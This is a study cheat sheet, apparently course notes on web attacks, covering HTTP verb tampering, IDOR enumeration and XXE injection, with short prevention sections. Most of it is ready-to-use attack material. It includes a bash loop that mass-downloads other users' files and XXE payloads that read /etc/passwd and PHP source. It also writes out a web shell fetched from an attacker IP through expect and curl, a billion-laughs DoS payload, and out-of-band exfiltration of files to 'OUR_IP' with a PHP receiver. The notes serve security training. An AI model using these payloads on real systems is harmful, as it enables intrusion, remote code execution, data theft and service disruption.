# Web Attacks

---

## HTTTP Verb Tampering


- understand the 9 different verb of http request
    - HEAD, PUT, POST, GET, PATCH, DELETE, CONNECT, OPTIONS, TRACE

#### Bypassing Basic Authentication

```bash
# 1 - Detect the restricted directory or page 

# 2 - Identify the request method

# 3 - Change the method with burp ( ex : GET => POST or HEAD )
```

#### Bypassing Security Filters

```bash
# 1 - Identify the filter

# 2 - Intercept the request and change the method to test*

# 3 - Do modifications tests with the new method
```

#### Verb Tampering Prevention
- The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected.
- it is not secure to limit the authorization configuration to a specific HTTP verb. This is why we should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods.

---

## Insecure Direct Object References (IDOR)

#### Intro to IDOR
- Insecure Direct Object References (IDOR) vulnerabilities are among the most common web vulnerabilities
- IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.
- can conduct to : 
    - **IDOR Information Disclosure Vulnerabilities**
    - **weak access control system** vulnerability/ exploit 

#### Identifying IDORs
- Verify URL and api params ( use burp if necessary)
    ```bash
    # ex : uid=1 or ?filename=file_1.pdf
    ```
- Verify cookies and http headers

- Verify functions and AJAX calls

- Understand Hashing/Encoding

- Compare User Roles
    - If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references

#### Mass IDOR Enumeration

###### Insecure Parameters
```bash
# Use burp intruder to fuzz parameter ex: uid

# Alternative

#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/<page.php>?<Parameter>=$i" | grep -oP "<\/documents.*?.pdf | fileNameRegex>"); do
                wget -q $url/$link
        done
done
```

#### Bypassing Encoded References

- Search if the hash was perform on front end 

```bash
# 1 - Use burp comparer to fuzz parameter hashed ex: uid

# 1 - alternative to generate hash : ex md5(base64(i))
    #loop with bash
    for i in {<Number>..<Number>}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

# 2 - User burp intruder to get access
```


#### IDOR in Insecure APIs
- Try to fuzz more params as possible to know the behavior of the api when lot params are exposed in front end
- Try to change the method to see the result like in verb tampering section


#### Chaining IDOR Vulnerabilities
- Combine multiple IDOR vuln to retreive information
- Use other tech like XSS....

##### IDOR Prevention
-we first have to build an object-level access control system and then use secure references for our objects when storing and calling them.

-  To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource.
    - They would only be allowed to access it if they have the right to do

- We should never use object references in clear text or simple patterns.       
    - We should always use strong and unique references, like salted hashes or UUID's. 
    - we should never calculate hashes on the front-end. 
    - We should generate them when an object is created and store them in the back-end database. Then, we should create database maps to enable quick cross-referencing of objects and references.
    - Finally, we must note that using UUIDs may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. This is why strong object referencing is always the second step after implementing a strong access control system. 

---
## XML External Entity (XXE) Injection

##### XXE Intro

- XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure.

- XML Basics
    - **XML Document type definition**
        ```bash

        <?xml version="1.0" encoding="UTF-8"?>
        
        # declare Document type definition with external file
        <!DOCTYPE email SYSTEM "email.dtd">
        
        # alternative 

        # 1 - Reference URL
        <!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">

        # 2 - write it in the same file
        <!DOCTYPE email [
        <!ELEMENT email (date, time, sender, recipients, body)>
        <!ELEMENT recipients (to, cc?)>
        <!ELEMENT cc (to*)>
        <!ELEMENT date (#PCDATA)>
        <!ELEMENT time (#PCDATA)>
        <!ELEMENT sender (#PCDATA)>
        <!ELEMENT to  (#PCDATA)>
        <!ELEMENT body (#PCDATA)>
        ]>
        ``` 
    - **XML Entities**
        - Entitites are like variable
        - It can be referenced in an XML document with `**&** and **;**` as decorator (e.g. &company;)
        - When an entity is referenced, it will be replaced with its value by the XML parser.
        - We can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path.

        ```bash
        # declaration
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE email [
        <!ENTITY company "Inlane Freight">
        ]>

        # 
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE email [
        
        <!ENTITY **Entity-Name** SYSTEM "<Path|link>">
        <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
        ]>

        ```



#### Local File Disclosure

###### Identifying

- Can use burp to see of there is xml data transfert 

-  Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML
    - We can try changing the Content-Type header to application/xml, and then convert the JSON data to XML 
    - If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

Declare DTD if necessary + create entity

###### Reading Sensitive Files

```bash
<!DOCTYPE **DTD-NAME** [
  <!ENTITY **Entity-Name** SYSTEM "file://<Path | /etc/passwd>">
]>
```

###### Reading Source Code
- This trick only works with PHP web applications

    ```bash
    <!DOCTYPE **DTD-NAME** [
    <!ENTITY  **Entity-Name** SYSTEM "php://filter/convert.base64-encode/resource=<Path | file-Name>">
    ]>
    ```

###### Remote Code Execution with XXE

- this requires the PHP expect module to be installed and enabled.

- use php expect 
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

sudo python3 -m http.server 80


# in xxe injection 
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<OUR_IP>/shell.php'">
]>

call the entity
```

###### Other XXE Attacks

- Denial of Service
    ```bash
    <!DOCTYPE **DTD-NAME** [
    <!ENTITY a0 "DOS" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
    ]>
    
    call entity
    ```
    - this attack no longer works with modern web servers

#### Advanced File Disclosure ( xxe injection obfuscation)
###### Advanced Exfiltration with CDATA
- Bypass Method 1
    ```bash
    <!DOCTYPE **DTD-NAME** [
    <!ENTITY begin "<![CDATA[">
    <!ENTITY file SYSTEM "file://<Path>">
    <!ENTITY end "]]>">
    <!ENTITY joined "&begin;&file;&end;">
    ]>

    call &joined

    # this will not work, since XML prevents joining internal and external entities
    ```
- Bypass Method 2 ( bypass limitations of method 1 ) 
    ```bash
    # use external references 

    echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
    python3 -m http.server 8000

    # target machine 
    <!DOCTYPE **DTD-NAME** [
    <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
    <!ENTITY % file SYSTEM "file://<Target-dir-path>"> <!-- reference external file -->
    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
    <!ENTITY % xxe SYSTEM "http://<MY_IP>:8000/xxe.dtd"> <!-- reference our external DTD -->
    %xxe;
    ]>

    <**DTD-NAME**>&joined;</**DTD-NAME**> <!-- reference the &joined; entity to print the file content -->

    ```

###### Error Based XXE
- Use we have error possible

    ```bash

    # create xxe.dtd
    <!ENTITY % file SYSTEM "file://<Path-file-to-read>">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

    # target 
    <!DOCTYPE **DTD-NAME** [ 
    <!ENTITY % remote SYSTEM "http://<OUR_IP>:8000/xxe.dtd">
    %remote;
    %error;
    ]>
    ```



#### Blind Data Exfiltration

###### Out-of-band Data Exfiltration 

```bash
# xxe.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

# create php server with index.php
vi index.php

#write 
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>


# lancer
php -S 0.0.0.0:8000


# send to target
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

###### Automated OOB Exfiltration

- Use XXEinjector
```bash
# clone repo
git clone https://github.com/enjoiz/XXEinjector.git

# capture http request from burp suite We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool 

# like : 
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT


# run tool 
ruby XXEinjector.rb --host=127.0.0.1 --httpport=<PORT> --file=<Burp-Request-File> --path=<PATH> --oob=http --phpfilter

# read logs 
```



```bash

```


##### XXE Prevention

-  If a web application is vulnerable to XXE, this is some times due to an outdated XML library that parses the XML data.
    - Update the XML libraries
    -  we should also update any components that parse XML input
-  Using Safe XML Configurations
    - Disable referencing custom 
    - Document Type Definitions (DTDs)
    - Disable referencing External XML Entities
    - Disable Parameter Entity processing
    - Disable support for XInclude
    - Prevent Entity Reference Loops
    - Use Rest API avoiding SOAP API
    - Use WAF
